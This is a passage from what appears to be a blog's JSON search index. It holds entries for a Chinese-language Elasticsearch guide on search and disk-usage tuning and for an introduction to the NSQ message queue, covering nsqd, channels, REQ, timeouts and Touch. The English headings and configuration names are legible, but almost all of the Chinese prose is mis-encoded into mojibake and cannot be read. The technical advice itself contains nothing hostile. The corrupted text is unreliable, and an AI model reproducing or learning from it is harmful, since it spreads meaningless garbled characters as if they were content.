·å°±å¯ä»¥ç›´æ¥æ ¹æ® price_range è¿›è¡ŒæŸ¥è¯¢äº†ã€‚ Consider mapping identifiers as keyword æ•°å­—ä¸ä¸€å®šè¦æ˜ å°„ä¸ºæ•°å­—ç±»å‹å­—æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯ keyword ï¼Œç´¢å¼•æ•°å­—ç±»å‹å¯¹äº range æŸ¥è¯¢è¿›è¡Œäº†ä¼˜åŒ–ï¼Œè€Œ keyword åœ¨ term æŸ¥è¯¢æ—¶æ›´æœ‰åˆ©ã€‚ Avoid scripts é¿å…ä½¿ç”¨ scriptsï¼Œå¦‚æœä¸€å®šè¦ç”¨ï¼Œä¼˜å…ˆä½¿ç”¨ painless å’Œ expressions å¼•æ“ã€‚ Search rounded dates æ”¾å®½æ—¥æœŸç±»å‹çš„ç²¾åº¦ï¼Œç”±äº now æ˜¯å®æ—¶å˜åŠ¨çš„ï¼Œå› æ­¤æ— æ³•ç¼“å­˜ï¼Œè€Œå¦‚æœä½¿ç”¨è¯¸å¦‚ now-1h/m ï¼Œè¿™æ˜¯å¯ä»¥è¿›è¡Œç¼“å­˜çš„ï¼Œç›¸åº”çš„ç²¾åº¦ä¹Ÿå°±æˆäº†ä¸€åˆ†é’Ÿã€‚ Force-merge read-only indices å¼ºåˆ¶åˆå¹¶åªè¯»ç´¢å¼•ä¸ºå•ä¸€çš„ segment æ›´æœ‰åˆ©äºæœç´¢ã€‚ä½¿ç”¨åœºæ™¯å¸¸å¸¸æ˜¯ä¾‹å¦‚åŸºäºæ—¶é—´çš„ç´¢å¼•ï¼Œå†å²æ—¥æœŸçš„æ•°æ®ä¸å†æ”¹å˜ï¼Œå› æ­¤æ˜¯åªè¯»çš„ï¼Œè€Œå¯¹äºå­˜åœ¨å†™å…¥æ“ä½œçš„ç´¢å¼•ä¸å¾—è¿›è¡Œæ­¤é¡¹æ“ä½œã€‚ Warm up global ordinals Global ordinals æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨äº keyword å­—æ®µä¸Šè¿›è¡Œ terms aggregationsï¼Œå¯ä»¥åœ¨ mapping ä¸­è®¾ç½® eager_global_ordinals : true æå‰å‘Šè¯‰ ES è¿™ä¸ªå­—æ®µå°†ä¼šç”¨äºèšåˆæŸ¥è¯¢ã€‚ Warm up the filesystem cache ES é‡å¯åï¼Œfilesystem cache æ˜¯ç©ºçš„ï¼Œå¯ä»¥é€šè¿‡ index.store.preload æå‰å¯¼å…¥æŒ‡å®šæ–‡ä»¶åˆ°å†…å­˜ä¸­è¿›è¡Œé¢„çƒ­ï¼Œä½†æ˜¯å¦‚æœæ–‡ä»¶ç³»ç»Ÿç¼“å­˜ä¸å¤Ÿå¤§ï¼Œå°†ä¼šå¯¼è‡´æ‰€æœ‰æ•°æ®è¢« hold ä½ï¼Œä¸€å®šè¦å°å¿ƒä½¿ç”¨ã€‚ Use index sorting to speed up conjunctions ä½¿ç”¨ index sorting ç´¢å¼•æ’åºå¯ä»¥ä½¿è¿æ¥æ›´å¿«ï¼ˆç»„ç»‡ Lucene æ–‡æ¡£ idï¼Œä½¿è¿æ¥å¦‚ a AND b AND â€¦ æ›´é«˜æ•ˆï¼‰ï¼Œä½†ä»£ä»·æ˜¯æ„å»ºç´¢å¼•å°†å˜æ…¢ã€‚ Use preference to optimize cache utilization ç¼“å­˜åŒ…æ‹¬ filesystem cacheã€request cacheã€query cache ç­‰éƒ½æ˜¯åŸºäº node èŠ‚ç‚¹çš„ï¼Œä½¿ç”¨ preference æ›´å¤Ÿå°†åŒæ ·çš„è¯·æ±‚è·¯ç”±åˆ°åŒæ ·çš„åˆ†ç‰‡ä¹Ÿå°±æ˜¯åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œè¿™æ ·èƒ½å¤Ÿæ›´å¥½çš„åˆ©ç”¨ç¼“å­˜ã€‚ replicas might help with throughput, but not always å¤‡ä»½ä¹Ÿä¼šå‚ä¸æŸ¥è¯¢ï¼Œè¿™æœ‰åŠ©äºæé«˜ååé‡ï¼Œä½†å¹¶éæ€»æ˜¯å¦‚æ­¤ã€‚ å¦‚ä½•è®¾ç½®å¤‡ä»½çš„æ•°é‡ï¼Ÿå‡è®¾é›†ç¾¤ä¸­æœ‰ num_nodes ä¸ªèŠ‚ç‚¹ï¼Œnum_primaries ä¸ªä¸»åˆ†ç‰‡ï¼Œä¸€æ¬¡æœ€å¤šå…è®¸ max_failures ä¸ªèŠ‚ç‚¹æ•…éšœï¼Œé‚£ä¹ˆå¤‡ä»½çš„æ•°é‡åº”è¯¥è®¾ç½®ä¸º max( max_failures, ceil( num_nodes/num_primaries ) - 1 ) Turn on adaptive replica selection å¼€å¯åŠ¨æ€å‰¯æœ¬é€‰æ‹©ï¼ŒES å°†ä¼šåŸºäºå‰¯æœ¬çš„çŠ¶æ€åŠ¨æ€é€‰æ‹©ä»¥å¤„ç†è¯·æ±‚ã€‚ PUT /_cluster/settings { \"transient\": { \"cluster.routing.use_adaptive_replica_selection\": true } } ","date":"2018-07-29","objectID":"/es-guide/:5:4","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Tune for disk usage ä¼˜åŒ–ç£ç›˜ä½¿ç”¨ã€‚ Disable the features you do not need ä¸éœ€è¦æ„å»ºå€’æ’ç´¢å¼•çš„å­—æ®µä¸å»ºç´¢å¼•ï¼Œindex: falseã€‚ text ç±»å‹å­—æ®µä¸éœ€è¦è¯„åˆ†çš„å¯ä»¥ä¸å†™å…¥ normsï¼Œnorms: false ï¼ˆnorms æ˜¯è¯„åˆ†å› å­ï¼‰ã€‚text ç±»å‹å­—æ®µé»˜è®¤ä¹Ÿä¼šå­˜å‚¨é¢‘ç‡å’Œä½ç½®ä¿¡æ¯ï¼Œé¢‘ç‡è®¡ç®—åˆ†æ•°ï¼Œä½ç½®ç”¨äºçŸ­è¯­æŸ¥è¯¢ï¼Œä¸éœ€è¦çŸ­è¯­æŸ¥è¯¢å¯ä»¥ä¸å­˜å‚¨ä½ç½®ä¿¡æ¯ï¼Œindex_options: freqs ï¼Œä¸å…³å¿ƒè¯„åˆ†å¯ä»¥è®¾ç½® index_options: freqs çš„åŒæ—¶è®¾ç½® norms: false ã€‚ Donâ€™t use default dynamic string mappings é»˜è®¤çš„åŠ¨æ€å­—ç¬¦ä¸²æ˜ å°„ä¼šå°† string å­—æ®µåŒæ—¶ç´¢å¼•ä¸º text å’Œ keyword ï¼Œè¿™é€ æˆäº†ç©ºé—´çš„æµªè´¹ï¼Œæ˜ç¡®ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªå³å¯ã€‚ Watch your shard size shard åˆ†ç‰‡è¶Šå¤§ï¼Œåˆ™å­˜å‚¨æ•°æ®è¶Šé«˜æ•ˆï¼Œç¼ºç‚¹å°±æ˜¯æ¢å¤éœ€è¦çš„æ—¶é—´æ›´ä¹…ã€‚ Disable _all ç¦ç”¨ _all ï¼Œæ­¤å­—æ®µç´¢å¼•äº†æ‰€æœ‰çš„å­—æ®µï¼Œ v6.0.0 ç‰ˆæœ¬å·²ç»å°†å…¶ç§»é™¤ã€‚ Disable _source ç¦ç”¨ _source ï¼Œæ­¤å­—æ®µå­˜å‚¨äº†åŸå§‹çš„ json æ–‡æ¡£æ•°æ®ï¼Œè™½ç„¶ç¦ç”¨å¯ä»¥èŠ‚çœç£ç›˜ç©ºé—´ï¼Œä½†æ˜¯æˆ‘ä¸ªäººå¹¶ä¸å»ºè®®è¿™ä¹ˆåšï¼Œå› ä¸ºç¦ç”¨åå°†æ— æ³•è·å–åˆ°æ­¤å­—æ®µçš„å†…å®¹ï¼Œå¦‚ update å’Œ reindex ç­‰ API éƒ½å°†æ— æ³•ä½¿ç”¨ã€‚ Use best_compression é€šè¿‡ index.codec è®¾ç½®å‹ç¼©æ–¹å¼ä¸º best_compression ã€‚ Force merge æ¯ä¸ª shard åˆ†ç‰‡æœ‰å¤šä¸ª segmentsï¼Œsegment è¶Šå¤§å­˜å‚¨æ•°æ®è¶Šé«˜æ•ˆã€‚å¯ä»¥é€šè¿‡ _forcemerge API å‡å°‘æ¯ä¸ªåˆ†ç‰‡çš„ segments æ•°é‡ï¼Œé€šè¿‡ max_num_segments = 1 å³å¯è®¾ç½®æ¯ä¸ªåˆ†ç‰‡ä¸€ä¸ª segment ã€‚ Shrink index å¯ä»¥é€šè¿‡ shrink API å‡å°‘ shard åˆ†ç‰‡çš„æ•°é‡ï¼Œå¯ä»¥ä¸ _forcemerge API ä¸€èµ·ä½¿ç”¨ã€‚ Use the smallest numeric type that is sufficient ä½¿ç”¨åˆé€‚çš„æ•°å­—ç±»å‹ï¼Œæ•°å­—ç±»å‹è¶Šå°å ç”¨ç£ç›˜ç©ºé—´è¶Šå°‘ã€‚ Use index sorting to colocate similar documents é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–‡æ¡£æŒ‰ç…§æ·»åŠ åˆ°ç´¢å¼•çš„é¡ºåºè¿›è¡Œå‹ç¼©ï¼Œå¦‚æœå¯ç”¨äº† index sorting åˆ™æŒ‰ç…§ç´¢å¼•æ’åºé¡ºåºè¿›è¡Œå‹ç¼©ï¼Œå¯¹å…·æœ‰ç›¸ä¼¼ç»“æ„ã€å­—æ®µå’Œå€¼çš„æ–‡æ¡£è¿›è¡Œæ’åºå¯ä»¥æé«˜å‹ç¼©æ•ˆç‡ã€‚ Put fields in the same order in documents å‹ç¼©æ˜¯å°†å¤šä¸ªæ–‡æ¡£å‹ç¼©æˆå—ï¼Œå¦‚æœå­—æ®µå§‹ç»ˆä»¥ç›¸åŒçš„é¡ºåºå‡ºç°ï¼Œåˆ™æ›´æœ‰å¯èƒ½åœ¨è¿™äº› _source æ–‡æ¡£ä¸­æ‰¾åˆ°æ›´é•¿çš„é‡å¤å­—ç¬¦ä¸²ï¼Œä»è€Œå‹ç¼©æ•ˆç‡æ›´é«˜ã€‚ å…¶å®ä»å®é™…æƒ…å†µæ¥çœ‹ï¼Œç£ç›˜çš„æˆæœ¬å¾€å¾€æ˜¯æ¯”è¾ƒä½å»‰çš„ï¼Œæˆ‘ä»¬å¸¸å¸¸æ›´å…³æ³¨çš„æ˜¯æœç´¢å’Œç´¢å¼•æ€§èƒ½çš„æå‡ã€‚äº†è§£ä¼˜åŒ–ç›¸å…³çš„éƒ¨åˆ†å†…å®¹æœ‰åŠ©äºæˆ‘ä»¬æ›´å¥½çš„ç†è§£å’Œä½¿ç”¨ ESã€‚ ","date":"2018-07-29","objectID":"/es-guide/:5:5","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Middleware"],"content":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","date":"2018-07-08","objectID":"/nsq/","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"ä¸€ NSQ æ˜¯ä»€ä¹ˆï¼Ÿä½¿ç”¨ go è¯­è¨€å¼€å‘çš„ä¸€æ¬¾å¼€æºçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå…·æœ‰è½»é‡çº§ã€é«˜æ€§èƒ½çš„ç‰¹ç‚¹ã€‚ ","date":"2018-07-08","objectID":"/nsq/:0:0","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"æ¦‚è¿° NSQ ç»„ä»¶ï¼š 1ã€nsqdï¼šæ¥å—ã€æ’é˜Ÿã€ä¼ é€’æ¶ˆæ¯çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ ¸å¿ƒã€‚ 2ã€nsqlookupdï¼šç®¡ç†æ‹“æ‰‘ä¿¡æ¯ï¼Œå…¶å®å°±æ˜¯å›´ç»• nsqd çš„å‘ç°æœåŠ¡ï¼Œå› ä¸ºå…¶å­˜å‚¨äº† nsqd èŠ‚ç‚¹çš„æ³¨å†Œä¿¡æ¯ï¼Œæ‰€ä»¥é€šè¿‡å®ƒå°±å¯ä»¥æŸ¥è¯¢åˆ°æŒ‡å®š topic ä¸»é¢˜çš„ nsqd èŠ‚ç‚¹ã€‚ 3ã€nsqadminï¼šä¸€å¥—å°è£…å¥½çš„ WEB UI ï¼Œå¯ä»¥çœ‹åˆ°å„ç§ç»Ÿè®¡æ•°æ®å¹¶è¿›è¡Œç®¡ç†æ“ä½œã€‚ 4ã€utilitiesï¼šå°è£…å¥½çš„ä¸€äº›ç®€å•çš„å·¥å…·ï¼ˆå®é™…å¼€å‘ä¸­ç”¨çš„ä¸å¤šï¼‰ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 1ã€ç”Ÿäº§è€… producer å°†æ¶ˆæ¯æŠ•é€’åˆ°æŒ‡å®šçš„ nsqd ä¸­æŒ‡å®šçš„ topic ä¸»é¢˜ã€‚ 2ã€nsqd å¯ä»¥æœ‰å¤šä¸ª topic ä¸»é¢˜ï¼Œä¸€æ—¦å…¶æ¥å—åˆ°æ¶ˆæ¯ï¼Œå°†ä¼šæŠŠæ¶ˆæ¯å¹¿æ’­åˆ°æ‰€æœ‰ä¸è¿™ä¸ª topic ç›¸è¿çš„ channel é˜Ÿåˆ—ä¸­ã€‚ 3ã€channel é˜Ÿåˆ—æ¥æ”¶åˆ°æ¶ˆæ¯åˆ™ä¼šä»¥è´Ÿè½½å‡è¡¡çš„æ–¹å¼éšæœºçš„å°†æ¶ˆæ¯ä¼ é€’åˆ°ä¸å…¶è¿æ¥çš„æ‰€æœ‰ consumer æ¶ˆè´¹è€…ä¸­çš„æŸä¸€ä¸ªã€‚ æ³¨æ„ï¼šç”Ÿäº§è€…å…³æ³¨çš„æ˜¯ topicï¼Œæ¶ˆè´¹è€…å…³æ³¨çš„æ˜¯ channelã€‚æ¶ˆæ¯æ˜¯å­˜åœ¨ channel é˜Ÿåˆ—ä¸­çš„ï¼Œå…¶ä¼šä¸€ç›´ä¿å­˜æ¶ˆæ¯ç›´åˆ°æœ‰æ¶ˆè´¹è€…å°†æ¶ˆæ¯æ¶ˆè´¹æ‰ï¼ŒåŒæ—¶ channel é˜Ÿåˆ—ä¸€æ—¦åˆ›å»ºå…¶æœ¬èº«ä¹Ÿä¸ä¼šè‡ªåŠ¨æ¶ˆå¤±ï¼Œå¦å¤–æ¶ˆæ¯é»˜è®¤æ˜¯å­˜åœ¨å†…å­˜ä¸­çš„ï¼Œä¸€æ—¦è¶…è¿‡å†…å­˜å¤§å°ï¼ˆå¯é€šè¿‡ â€“mem-queue-size é…ç½®ï¼‰åˆ™ä¼šè¢«å­˜å‚¨åˆ°ç£ç›˜ä¸Šã€‚ å†çœ‹ä¸‹å›¾ï¼š é€šè¿‡ nsqadmin å¯ä»¥çœ‹åˆ°æ•´ä¸ªé›†ç¾¤çš„ç»Ÿè®¡ä¿¡æ¯å¹¶è¿›è¡Œç®¡ç†ï¼Œå¤šä¸ª nsqd èŠ‚ç‚¹ç»„æˆé›†ç¾¤å¹¶å°†å…¶åŸºæœ¬ä¿¡æ¯æ³¨å†Œåˆ° nsqlookupd ä¸­ï¼Œé€šè¿‡ nsqlookupd å¯ä»¥å¯»å€åˆ°å…·ä½“çš„ nsqd èŠ‚ç‚¹ï¼Œè€Œä¸è®ºæ˜¯æ¶ˆæ¯çš„ç”Ÿäº§è€…è¿˜æ˜¯æ¶ˆè´¹è€…ï¼Œå…¶æœ¬è´¨ä¸Šéƒ½æ˜¯ä¸ nsqd è¿›è¡Œé€šä¿¡ï¼ˆå¦‚ç¬¬ä¸€å¼ å›¾æ‰€ç¤ºï¼‰ã€‚ ","date":"2018-07-08","objectID":"/nsq/:1:0","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"å…¶å®ƒ 1ã€é»˜è®¤æƒ…å†µä¸‹æ¶ˆæ¯ä¸ä¼šè¢«æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œåªæœ‰å½“è¶…å‡ºå†…å­˜é™åˆ¶æ—¶æ‰ä¼šå°†éƒ¨åˆ†æ¶ˆæ¯å†™å…¥ç£ç›˜ï¼Œä½†åªè¦è®¾ç½® â€“mem-queue-size=0 å°±å¯ä»¥å°†æ‰€æœ‰æ¶ˆæ¯éƒ½æŒä¹…åŒ–åˆ°ç£ç›˜ã€‚ 2ã€NSQ ä¿è¯æ¶ˆæ¯è‡³å°‘è¢«ä¼ é€’ä¸€æ¬¡ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½æç«¯æƒ…å†µä¸‹ä¼šè¢«ä¼ é€’å¤šæ¬¡ï¼Œæ¶ˆè´¹è€…éœ€è¦é¢å¤–æ³¨æ„è¿™ä¸€ç‚¹ã€‚ 3ã€æ¶ˆæ¯æ˜¯æ— åºçš„ã€‚ 4ã€å®˜æ–¹å»ºè®®å°† nsqd ä¸æ¶ˆæ¯çš„ç”Ÿäº§è€…éƒ¨ç½²åˆ°ä¸€èµ·ï¼Œè¿™ç§æ¨¡å¼å°†æ¶ˆæ¯æµæ„å»ºä¸ºæ¶ˆè´¹é—®é¢˜è€Œä¸æ˜¯ç”Ÿäº§é—®é¢˜ï¼Œè¿™ç§æ¨¡å¼æ›´åŠ ç®€å•ä½†éå¼ºåˆ¶ã€‚ 5ã€nsqlookupd å¹¶éä¸€å®šè¦ä½¿ç”¨ï¼Œä½†åœ¨é›†ç¾¤æ¨¡å¼ä¸‹å»ºè®®ä½¿ç”¨ï¼Œå®˜æ–¹å»ºè®®æ¯ä¸ªæ•°æ®ä¸­å¿ƒéƒ¨ç½²è‡³å°‘ä¸‰ä¸ª nsqlookupd å°±å¯ä»¥åº”å¯¹æˆç™¾ä¸Šåƒçš„é›†ç¾¤èŠ‚ç‚¹ï¼ˆæ¯ä¸ªnsqlookupd ä¸­é—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œä¿è¯å…¶é«˜å¯ç”¨ï¼‰ã€‚ 6ã€topic å’Œ channel æ²¡æœ‰å†…ç½®çš„é™åˆ¶ï¼Œä½†å…¶ä¼šå—é™äºå®¿ä¸»æœºçš„CPUå’Œå†…å­˜æ€§èƒ½ã€‚ 7ã€nsq æ²¡æœ‰å¤æ‚çš„è·¯ç”±ï¼Œæ²¡æœ‰ replication å‰¯æœ¬å¤‡ä»½ã€‚ æ€»è€Œè¨€ä¹‹ï¼ŒNSQ é«˜æ•ˆè½»é‡ã€ç®€å•ã€æ˜“äºåˆ†å¸ƒå¼æ‰©å±•ã€‚å¦å¤–æœ‰èµå›¢é˜Ÿè‡ªå·±æ”¹é€ äº†ä¸€ç‰ˆ NSQ å¹¶å¼€æºäº†å‡ºæ¥ï¼ˆ https://github.com/youzan/nsq ï¼‰ï¼Œè§†é¢‘ï¼šhttps://www.youtube.com/watch?v=GCOvuCKe5zA ï¼Œæ„Ÿå…´è¶£çš„ä¹Ÿå¯ä»¥äº†è§£ä¸‹ã€‚ äºŒ ","date":"2018-07-08","objectID":"/nsq/:2:0","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"ä¿¡æ¯æµ ä»»ä½•ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„ä¿¡æ¯æµéƒ½å¯ä»¥æŠ½è±¡ä¸ºï¼š ç”Ÿäº§è€… \u003e\u003e MQ \u003e\u003e æ¶ˆè´¹è€… NSQ ä¹Ÿä¸ä¾‹å¤–ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š nsqd æ˜¯æ¥å—ã€æ’é˜Ÿã€ä¼ é€’æ¶ˆæ¯çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ ¸å¿ƒã€‚ ","date":"2018-07-08","objectID":"/nsq/:3:0","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"producer Â» nsqd ç”Ÿäº§è€…åŒ…è£…æ¶ˆæ¯ï¼Œå°†æ¶ˆæ¯ä¼ é€’åˆ° nsqd ä¸­æŒ‡å®šçš„ topic ã€‚åœ¨ NSQ ä¸­è¿™ä¸€ä¸ªæ­¥éª¤ç›¸å½“ç®€å•ï¼Œé€šè¿‡ HTTP æ¥å£å°±èƒ½å®Œæˆï¼š å‘é€æ¶ˆæ¯å¿…é¡»æŒ‡å®š topic ï¼Œè€Œ topic çš„ä½œç”¨å…¶å®å°±æ˜¯å¯¹æ¶ˆæ¯è¿›è¡Œé€»è¾‘ä¸Šçš„åˆ†åŒºã€‚ æ¥å£ /pub ç”¨æ¥å‘é€å•æ¡æ¶ˆæ¯ï¼Œå…¶ä¸­çš„ defer å‚æ•°ç”¨æ¥æŒ‡å®š NSQ åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯åå»¶æ—¶å¤šä¹…å†æŠ•é€’ç»™æ¶ˆè´¹è€…ï¼Œä¾‹å¦‚è®¢å•è§„å®šæ—¶é—´å†…æœªæ”¯ä»˜åˆ™è¿›è¡Œå›æ”¶ç­‰åœºæ™¯å°±å¯ä»¥ç”¨åˆ°å»¶æ—¶é˜Ÿåˆ—ã€‚æ¥å£ /mpub ç”¨æ¥ä¸€æ¬¡å‘é€å¤šæ¡æ¶ˆæ¯ã€‚ ç›¸å…³é…ç½® -max-msg-size : å•æ¡æ¶ˆæ¯çš„å¤§å°ä¸Šé™ï¼Œé»˜è®¤ 1048576 byte å³ 1 Mã€‚ ","date":"2018-07-08","objectID":"/nsq/:3:1","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"nsqd: topic Â» channel ä¸Šé¢å·²ç»è¯´è¿‡ï¼Œtopic åªæ˜¯ç”¨æ¥å°†æ¶ˆæ¯è¿›è¡Œé€»è¾‘åˆ’åˆ†ï¼Œchannel æ‰æ˜¯çœŸæ­£å­˜æ”¾æ¶ˆæ¯çš„åœ°æ–¹ï¼Œè€Œ nsqd åœ¨æ¥å—åˆ°æ¶ˆæ¯åï¼Œä¼šå°†æ¶ˆæ¯å¤åˆ¶ç»™æ‰€æœ‰ä¸è¿™ä¸ª topic ç›¸è¿çš„ channel å¹¶å­˜æ”¾ã€‚ ","date":"2018-07-08","objectID":"/nsq/:3:2","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"nsqd Â» consumer å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œtopic çš„æ¶ˆæ¯ä¼šè¢«å¹¿æ’­åˆ°æ‰€æœ‰ä¸ä¹‹ç›¸è¿çš„ channel ï¼Œä½†æ˜¯åŒä¸€ä¸ª channel åªä¼šä»¥è´Ÿè½½å‡è¡¡çš„æ–¹å¼æŠŠæ¶ˆæ¯æŠ•é€’åˆ°ä¸ä¹‹ç›¸è¿çš„å…¶ä¸­ä¸€ä¸ª consumer æ¶ˆè´¹è€…ã€‚ ç›¸å…³é…ç½® max-in-flight : ä¸€ä¸ª consumer ä¸€æ¬¡æœ€å¤šå¤„ç†çš„æ¶ˆæ¯æ•°é‡ï¼Œé»˜è®¤ä¸ºä¸€æ¡ã€‚ ","date":"2018-07-08","objectID":"/nsq/:3:3","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"æ¶ˆæ¯å¤„ç† åœ¨å®é™…æƒ…å†µä¸‹ï¼Œnsqd ä¸ consumer ä¹‹é—´çš„æ¶ˆæ¯å¤„ç†å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ã€‚ å…ˆæ¥çœ‹çœ‹è¯¦ç»†çš„è¿‡ç¨‹ï¼š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œconsumer éœ€è¦å…ˆè¿æ¥åˆ° nsqdï¼Œå¹¶ä¸”è®¢é˜…æŒ‡å®šçš„ topic å’Œ channel ï¼Œåœ¨ä¸€åˆ‡å‡†å¤‡å°±ç»ªä¹‹åå‘é€ RDY çŠ¶æ€è¡¨ç¤ºå¯ä»¥æ¥å—æ¶ˆæ¯ï¼Œå¹¶æŒ‡æ˜ä¸€æ¬¡å¯ä»¥å¤„ç†çš„æœ€å¤§æ¶ˆæ¯æ•°é‡ max-in-flight ä¸º 2 ï¼Œéšå nsqd å‘ consumer æŠ•é€’æ¶ˆæ¯ï¼Œconsumer æ¶ˆè´¹è€…åœ¨æ¥å—åˆ°æ¶ˆæ¯åè¿›è¡Œä¸šåŠ¡å¤„ç†ï¼Œå¹¶ä¸”éœ€è¦å‘ nsqd å“åº” FINï¼ˆæ¶ˆæ¯å¤„ç†æˆåŠŸï¼‰æˆ–è€… REQï¼ˆ re-queue é‡æ–°æ’é˜Ÿï¼‰ï¼ŒæŠ•é€’å®Œæˆä½†æœªå“åº”çš„è¿™æ®µæ—¶é—´å†…çš„æ¶ˆæ¯çŠ¶æ€ä¸º in-flight ã€‚ é…ç½®é¡¹ -max-rdy-count ï¼šæ¯ä¸ª nsqd æœ€å¤šå¯ä»¥æ¥å—çš„ RDY å³æ¶ˆè´¹è€…çš„æ•°é‡ï¼Œè¶…å‡ºèŒƒå›´åˆ™è¿æ¥å°†è¢«å¼ºåˆ¶å…³é—­ï¼Œé»˜è®¤ 2500 ã€‚ ","date":"2018-07-08","objectID":"/nsq/:4:0","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"REQ å¯¹äº REQ å“åº”ï¼Œnsq ä¼šå°†å…¶é‡æ–°åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­ç­‰å¾…ä¸‹ä¸€æ¬¡å†æŠ•é€’ï¼ˆ re-queue ï¼‰ï¼Œå®¢æˆ·ç«¯å¯ä»¥æŒ‡å®š requeue çš„ delay å»¶æ—¶ï¼Œå³é‡æ–°æ’é˜Ÿå¹¶å»¶æ—¶ä¸€æ®µæ—¶é—´ä¹‹åå†é‡æ–°æŠ•é€’æ¶ˆæ¯ï¼Œå»¶æ—¶çš„æ—¶é—´ä¸å¾—è¶…è¿‡é…ç½®é¡¹ -max-req-timeout ã€‚ ","date":"2018-07-08","objectID":"/nsq/:4:1","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"Timeout æ¯ä¸€æ¡æ¶ˆæ¯éƒ½å¿…é¡»åœ¨ä¸€å®šæ—¶é—´å†…å‘ nsq åšå‡ºå“åº”ï¼Œå¦åˆ™ nsq ä¼šè®¤ä¸ºè¿™æ¡æ¶ˆæ¯è¶…æ—¶ï¼Œç„¶å requeue å¤„ç†ã€‚ é…ç½®é¡¹ -msg-timeout ï¼šå•æ¡æ¶ˆæ¯çš„è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ä¸€åˆ†é’Ÿï¼Œå³æ¶ˆæ¯æŠ•é€’åä¸€åˆ†é’Ÿå†…æœªæ”¶åˆ°å“åº”ï¼Œåˆ™ nsq ä¼šå°†è¿™æ¡æ¶ˆæ¯ requeue å¤„ç†ã€‚ é…ç½®å€¼ -max-msg-timeout ï¼šnsqd å…¨å±€è®¾ç½®çš„æœ€å¤§è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ 15 åˆ†é’Ÿã€‚ è¶…æ—¶çš„åˆ¤å®šæ—¶é•¿å°†å–å†³äºä»¥ä¸Šä¸¤ä¸ªé…ç½®çš„æœ€å°å€¼ã€‚ ","date":"2018-07-08","objectID":"/nsq/:4:2","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"Touch æœ‰æ—¶å€™ consumer éœ€è¦æ›´é•¿çš„æ—¶é—´æ¥å¯¹æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œè€Œä¸æƒ³è¢« nsq åˆ¤å®šè¶…æ—¶ç„¶å requeue ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä¸»åŠ¨å‘ nsq å“åº” Touch ï¼Œè¡¨ç¤ºæ¶ˆæ¯æ˜¯æ­£å¸¸å¤„ç†çš„ï¼Œä½†æ˜¯éœ€è¦æ›´é•¿æ—¶é—´ï¼Œnsq æ¥å—åˆ° Touch å“åº”åå°±ä¼šåˆ·æ–°è¿™æ¡æ¶ˆæ¯çš„è¶…æ—¶æ—¶é—´ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½ä¸€ç›´ Touch åˆ°æ°¸è¿œï¼Œå…¶ä»å—åˆ¶äºé…ç½®é¡¹ -max-msg-timeout ï¼Œè¶…å‡ºæœ€å¤§æ—¶é•¿äº† Touch ä¹Ÿæ²¡ç”¨ï¼Œnsq ä»ç„¶ä¼šåˆ¤å®šä¸ºè¶…æ—¶å¹¶ requeue ã€‚ 